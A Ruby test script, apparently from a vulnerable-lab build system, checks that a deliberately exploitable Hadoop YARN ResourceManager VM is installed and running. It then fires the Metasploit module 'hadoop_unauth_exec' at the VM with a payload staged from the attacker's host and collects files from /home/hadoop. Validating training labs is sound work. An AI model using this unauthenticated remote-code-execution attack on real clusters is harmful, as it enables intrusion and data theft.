require_relative '../../../../../lib/post_provision_test'

class HadoopYarnRceTest < PostProvisionTest
  RM_PORT = 8088

  def initialize
    self.module_name = 'hadoop_yarn_rce'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super

    tier(1) do
      test_local_command('java 11 installed', '/usr/local/jdk11/bin/java -version 2>&1', '11.0')
      test_local_command('hadoop installed', 'readlink -f /usr/local/hadoop/bin/hadoop', 'hadoop')
      test_local_command('hadoop service account exists', 'id hadoop', 'uid=')
      test_local_command('resourcemanager unit installed', 'test -f /etc/systemd/system/hadoop-resourcemanager.service && echo present', 'present')
    end

    # The ResourceManager is a sizeable JVM service; give it time to finish
    # starting before checking the port/HTTP response.
    wait_for_resourcemanager

    tier(2) do
      test_service_up(port: RM_PORT)
      test_command_succeeds('resourcemanager service active', 'systemctl is-active hadoop-resourcemanager')
      test_command_succeeds('nodemanager service active', 'systemctl is-active hadoop-nodemanager')
      test_http('/ws/v1/cluster/info', match: 'resourceManagerVersion', port: RM_PORT)
    end

    # exploit/linux/http/hadoop_unauth_exec uses execute_cmdstager: it builds a
    # native linux/x64/exec ELF and stages it via a transient HTTP server on
    # LHOST. Resolve the attacker IP first so it can be passed as LHOST.
    # sentinel_wait: the NodeManager schedules the container asynchronously, so
    # execution is deferred a few seconds after job submission.
    tier(3) do
      resolved = resolve_attacker('exploit/linux/http/hadoop_unauth_exec', nil, nil, 3)
      next unless resolved
      _, attacker_ip, _ = resolved
      test_msf_exploit('exploit/linux/http/hadoop_unauth_exec',
                       rport: RM_PORT,
                       payload: 'linux/x64/exec',
                       collect: 'cat /home/hadoop/*',
                       options: { 'LHOST' => attacker_ip },
                       sentinel_wait: 120)
    end
  end

  # test_service_up/test_http run inside the guest; settle here before them
  # since the RM JVM can take a while past VM boot to open its port.
  def wait_for_resourcemanager
    tries = 0
    loop do
      result = run_command("ss -ltn | grep -q ':#{RM_PORT} ' && echo up || echo down")
      break if result[:stdout].to_s.include?('up')
      tries += 1
      break if tries >= 18 # ~90s at 5s each, on top of the harness's own settle
      sleep 5
    end
  end
end

HadoopYarnRceTest.new.run
